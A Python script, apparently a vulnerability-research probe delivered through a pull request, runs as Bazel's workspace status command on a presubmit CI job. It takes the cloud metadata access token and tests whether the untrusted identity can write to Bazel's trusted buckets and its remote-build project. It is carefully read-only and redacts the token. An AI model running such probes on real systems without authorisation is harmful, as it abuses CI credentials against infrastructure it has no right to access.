#!/usr/bin/env python3
"""Read-only IAM permission-test probe for Bazel's untrusted presubmit identity.

Installed as scripts/ci/pwnreq_iam_probe.py and run once per Bazel invocation as the
workspace status command on one Linux presubmit job. It performs ONLY:
  * GET  GCE metadata: service-account email, scopes, access token; project id
  * GET  https://storage.googleapis.com/storage/v1/b/<bucket>/iam/testPermissions
  * POST https://cloudresourcemanager.googleapis.com/v1/projects/<id>:testIamPermissions
No object, cache, action, blob, IAM-policy or repository write is possible through the
transport below (method/host/path allowlist, redirects refused). The access token is
never printed, hashed, or written anywhere; the output is swept for it before printing.
"""

import json
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

MARKER = "pwnreq-bazel-iam-20261115"
METADATA_HOST = "169.254.169.254"

TARGET_BUCKETS = ["bazel", "bazel-apt", "bazel-mirror", "bazel-trusted-build-cache"]
# Controls established by builds 37238/37239: read-only and write, for the same principal.
CONTROL_BUCKETS = {"bazel-builds": "known_read_only", "bazel-untrusted-build-cache": "known_write"}
# Fail-closed control: a bucket name that should not exist must yield "error", never "none".
MISSING_BUCKET = "pwnreq-iam-control-nonexistent-7f3c9e41b2"
GCS_PERMISSIONS = [
    "storage.buckets.get", "storage.buckets.getIamPolicy", "storage.buckets.setIamPolicy",
    "storage.buckets.update", "storage.objects.create", "storage.objects.delete",
    "storage.objects.get", "storage.objects.list", "storage.objects.update",
]
GCS_WRITE = {"storage.buckets.setIamPolicy", "storage.buckets.update", "storage.objects.create",
             "storage.objects.delete", "storage.objects.update"}

# RBE has no instance-level IAM test method; its IAM boundary is the project policy.
TARGET_PROJECT = "bazel-public"            # hosts projects/bazel-public/instances/default_instance
CONTROL_PROJECT = "bazel-untrusted"        # the presubmit's own RBE project (positive control)
MISSING_PROJECT = "pwnreq-iam-missing-7f3c9e"  # fail-closed control: must be "error", never "none"
RBE_PERMISSIONS = [
    "remotebuildexecution.actions.set",     # UpdateActionResult (roles/...actionCacheWriter)
    "remotebuildexecution.actions.update",
    "remotebuildexecution.actions.create",  # Execute
    "remotebuildexecution.actions.delete",
    "remotebuildexecution.actions.get",
    "remotebuildexecution.blobs.create",    # CAS upload
    "remotebuildexecution.blobs.get",
]
RBE_WRITE = {"remotebuildexecution.actions.set", "remotebuildexecution.actions.update",
             "remotebuildexecution.actions.create", "remotebuildexecution.actions.delete",
             "remotebuildexecution.blobs.create"}

ALLOWED = [
    ("GET", "http", METADATA_HOST,
     re.compile(r"^/computeMetadata/v1/(instance/service-accounts/default/(email|scopes|token)|project/project-id)$")),
    ("GET", "https", "storage.googleapis.com",
     re.compile(r"^/storage/v1/b/[a-z0-9][a-z0-9._-]{1,220}/iam/testPermissions$")),
    ("POST", "https", "cloudresourcemanager.googleapis.com",
     re.compile(r"^/v1/projects/[a-z][a-z0-9-]{4,61}:testIamPermissions$")),
]


class NotAllowed(Exception):
    pass


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):  # refuse every redirect
        return None


def check_allowed(method, url):
    u = urllib.parse.urlsplit(url)
    for m, scheme, host, path_re in ALLOWED:
        if method == m and u.scheme == scheme and u.hostname == host and u.port is None and path_re.match(u.path):
            return
    raise NotAllowed("%s %s://%s%s" % (method, u.scheme, u.hostname, u.path))


def real_transport(method, url, headers, body):
    check_allowed(method, url)
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}), _NoRedirect())
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with opener.open(req, timeout=15) as r:
            return r.status, r.read(65536)
    except urllib.error.HTTPError as e:
        return e.code, e.read(65536)
    except Exception as e:  # network failure is recorded, never treated as "no permission"
        return "exc:" + type(e).__name__, b""


def _json(body):
    try:
        return json.loads(body.decode("utf-8"))
    except Exception:
        return None


def _error_summary(body):
    d = _json(body)
    if isinstance(d, dict) and isinstance(d.get("error"), dict):
        e = d["error"]
        return {"code": e.get("code"), "status": e.get("status"), "message": str(e.get("message", ""))[:300]}
    return {"raw_prefix": body[:200].decode("utf-8", "replace")}


def classify(status, granted, write_set):
    if status != 200:
        return "error"            # fail-closed: inconclusive, never "none"
    w = sorted(set(granted) & write_set)
    if w:
        return "write"
    return "read_only" if granted else "none"


def test_bucket(transport, token, bucket):
    q = urllib.parse.urlencode([("permissions", p) for p in GCS_PERMISSIONS])
    url = "https://storage.googleapis.com/storage/v1/b/%s/iam/testPermissions?%s" % (bucket, q)
    headers = {"Authorization": "Bearer " + token} if token else {}
    status, body = transport("GET", url, headers, None)
    d = _json(body) if status == 200 else None
    granted = sorted((d or {}).get("permissions", [])) if isinstance(d, dict) else []
    out = {"method": "storage.buckets.testIamPermissions", "resource": "projects/_/buckets/" + bucket,
           "http_status": status, "granted": granted, "verdict": classify(status, granted, GCS_WRITE)}
    if status == 200:
        out["response_body"] = d
    else:
        out["error"] = _error_summary(body)
    return out


def test_project(transport, token, project):
    url = "https://cloudresourcemanager.googleapis.com/v1/projects/%s:testIamPermissions" % project
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    per = {}
    granted = []
    for perm in RBE_PERMISSIONS:  # one call per permission so an invalid name cannot mask others
        status, body = transport("POST", url, headers, json.dumps({"permissions": [perm]}).encode())
        d = _json(body) if status == 200 else None
        g = sorted((d or {}).get("permissions", [])) if isinstance(d, dict) else []
        rec = {"http_status": status, "granted": g}
        if status == 200:
            rec["response_body"] = d
        else:
            rec["error"] = _error_summary(body)
        per[perm] = rec
        granted += g
    statuses = {r["http_status"] for r in per.values()}
    overall = 200 if statuses == {200} else sorted(str(s) for s in statuses)
    return {"method": "cloudresourcemanager.projects.testIamPermissions",
            "resource": "projects/" + project, "covers_instance": "projects/%s/instances/default_instance" % project,
            "per_permission": per, "granted": sorted(set(granted)),
            "verdict": classify(overall, granted, RBE_WRITE)}


def should_run(env):
    return (env.get("BUILDKITE_ORGANIZATION_SLUG") == "bazel"
            and env.get("BUILDKITE_PIPELINE_SLUG") == "bazel-bazel-github-presubmit"
            and env.get("BUILDKITE_LABEL", "").startswith(":ubuntu: Ubuntu 24.04 LTS")
            and env.get("BUILDKITE_PARALLEL_JOB", "") in ("", "0"))


def sweep(text, token):
    bad = ["ya29.", "Bearer ", "access_token", "BEGIN PRIVATE KEY", "bkua_", "bkat_"]
    if token and token in text:
        return False
    return not any(b in text for b in bad)


def run(transport, env):
    report = {"marker": MARKER, "buildkite": {k: env.get(k, "") for k in (
        "BUILDKITE_ORGANIZATION_SLUG", "BUILDKITE_PIPELINE_SLUG", "BUILDKITE_BUILD_NUMBER", "BUILDKITE_JOB_ID",
        "BUILDKITE_LABEL", "BUILDKITE_PARALLEL_JOB", "BUILDKITE_COMMIT", "BUILDKITE_BRANCH",
        "BUILDKITE_PULL_REQUEST", "BUILDKITE_AGENT_NAME")}}
    md = "http://%s/computeMetadata/v1/" % METADATA_HOST
    mh = {"Metadata-Flavor": "Google"}
    s, b = transport("GET", md + "instance/service-accounts/default/email", mh, None)
    report["principal"] = {"status": s, "email": b.decode("utf-8", "replace").strip() if s == 200 else None}
    s, b = transport("GET", md + "project/project-id", mh, None)
    report["vm_project"] = b.decode("utf-8", "replace").strip() if s == 200 else {"status": s}
    s, b = transport("GET", md + "instance/service-accounts/default/scopes", mh, None)
    report["scopes"] = b.decode("utf-8", "replace").split() if s == 200 else {"status": s}
    s, b = transport("GET", md + "instance/service-accounts/default/token", mh, None)
    token = None
    if s == 200:
        d = _json(b) or {}
        token = d.get("access_token") or None
    report["token"] = {"status": s, "obtained": bool(token)}   # no value, no hash
    if token:
        report["targets"] = {bk: test_bucket(transport, token, bk) for bk in TARGET_BUCKETS}
        report["targets"]["rbe:" + TARGET_PROJECT] = test_project(transport, token, TARGET_PROJECT)
        report["controls"] = {bk: dict(test_bucket(transport, token, bk), expected=exp)
                              for bk, exp in CONTROL_BUCKETS.items()}
        report["controls"][MISSING_BUCKET] = dict(test_bucket(transport, token, MISSING_BUCKET), expected="error")
        report["controls"]["rbe:" + CONTROL_PROJECT] = dict(test_project(transport, token, CONTROL_PROJECT),
                                                            expected="write")
        report["controls"]["rbe:" + MISSING_PROJECT] = dict(test_project(transport, token, MISSING_PROJECT),
                                                            expected="error")
        c = report["controls"]
        report["controls_pass"] = (c["bazel-builds"]["verdict"] == "read_only"
                                   and c["bazel-untrusted-build-cache"]["verdict"] == "write"
                                   and c[MISSING_BUCKET]["verdict"] == "error"
                                   and c["rbe:" + CONTROL_PROJECT]["verdict"] == "write"
                                   and c["rbe:" + MISSING_PROJECT]["verdict"] == "error")
    text = json.dumps(report, sort_keys=True)
    token = None
    return text


def main():
    if not should_run(os.environ):
        print("PWNREQ_IAM_PROBE skipped")
        return
    text = None
    tok_holder = {}

    def guarded(method, url, headers, body):
        if headers and "Authorization" in headers:
            tok_holder["t"] = headers["Authorization"][len("Bearer "):]
        return real_transport(method, url, headers, body)

    try:
        text = run(guarded, dict(os.environ))
    except Exception as e:
        text = json.dumps({"marker": MARKER, "probe_error": type(e).__name__})
    if not sweep(text, tok_holder.get("t")):
        text = json.dumps({"marker": MARKER, "redaction_failure": True})
    tok_holder.clear()
    print("PWNREQ_IAM_RESULT " + text, file=sys.stderr)
    print("PWNREQ_IAM_PROBE done")


if __name__ == "__main__":
    try:
        main()
    except Exception as error:
        print("PWNREQ_IAM_PROBE error_%s" % type(error).__name__)
